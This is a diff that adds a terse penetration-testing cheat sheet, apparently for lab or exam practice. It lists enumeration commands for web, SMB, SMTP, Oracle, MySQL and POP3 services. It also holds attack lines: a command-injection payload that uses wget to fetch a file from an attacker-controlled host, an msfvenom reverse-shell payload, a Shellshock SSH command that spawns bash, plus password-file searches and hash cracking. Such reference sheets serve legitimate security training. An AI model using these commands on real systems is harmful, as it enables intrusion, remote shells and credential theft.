@@ -1,0 +1,100 @@
+Web - port 80,443
+
+# nikto -h <ip>
+# curl -x options <ip>
+# curl -s http://$ip/robots.txt
+# gobuster dir -u <ip> -w <wordlist> -e <extension>
+check for LFI, RFI,SQLi in URL & POST request parameters&FileUploads
+
+Mysql - port 3306  & MsSQL - port 1433
+
+# nmap -p 3306 --script="+*mysql* and not brute and not dos and not fuzzer" -vv -oN mysql $ip
+
+SMB - port 445,139 & RCP - port 111,135
+
+# enum4linux -a <ip>
+# nmap -p 139,445 <ip/mask> --script smb-enum-shares.nsesmb-os-discovery.nse 
+# nmap --script rpcinfo.nse <targetip> -p 111
+# rpclient -U "" -N
+# smbclient -L <ip> 
+# showmount -e $ip
+# smbmap -H[ip] -d [domain] -u [user] -p [password]
+# mount -t cifs //<server ip>/<share> <local dir> -o username="guest", password= ""
+
+SMTP Enumeration 
+
+# nc <ip> 25 (gets smtp banner for service versioning)
+
+# nmap --script smtp-comands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 <ip-address>
+
+# smtp-user-enum -M VRFY (or RCPT or EXPN) -U (userlist)
+
+Oracle Enumeration (port 1521)
+
+# tnscmd10g version -h INSERTIPADDRESS
+# tnscmd10g status -h INSERTIPADDRESS
+
+# tcpdump tcp port 80 -w out..pcap -i eth0
+
+commando Injection 
+
+# url.com/file.php[?path=]
+# ?path=/;wget http://<your_ip>: <port>/<file to be transferred>.<extension>
+
+add Shellcode
+
+# msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> EXITFUNC=thread -f <Code Format> -a x86 -platform windows -b "\x00"
+
+Application Mapping 
+
+# whatweb <ip address>
+
+Cracking Hashes 
+
+# john --rules --wordlist=/usr/share/wordlists/rockyoutxt unshadowed.txt
+
+search for passwords 
+
+# dir /s *password*
+# findstr /si password *ini*.xml*.txt
+# findstr /spin "password"*.*
+
+Directory Traversal for web
+
+# dotdotpwn -m http -h <host-ip> -o windows
+
+Tunneling 
+
+# sshuttle -r root@<10.10.10.1 10.10.10.0/24>
+
+File Uploads
+
+if you are unable to upload shell using .php , php3 , php5
+
+SSH Shellhock
+
+# ssh -i user (ssh.key) user@<ip> ' () {:;};/bin/bash'
+
+Generating custom wordlist
+
+# cewl -m 3 (minimum letter words) -w <output file name>
+
+DNS ZONE Transfer
+
+# dnsrecon -d TARGET -D /usr/share/wordlists/dnsmap.txt -t std --xml output.xml
+
+Finger service Enumeration 
+
+# finger-user-enum.pl [options] -u <username> / -U <userlist> -t <ip>
+
+POP3 Enumeration
+
+# telnet <ip> 110
+# user <username>
+# pass <password>
+# list (shows all emails)
+# retr (email number) -> Gets contents of the email
+
+Mysql Enumeration (port 3306)
+
+# nmap -Sv -Pn -vv <ip_address> -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,msql-querry,mysql-users,mysql-variables,mysql-vul-cve2012-2122
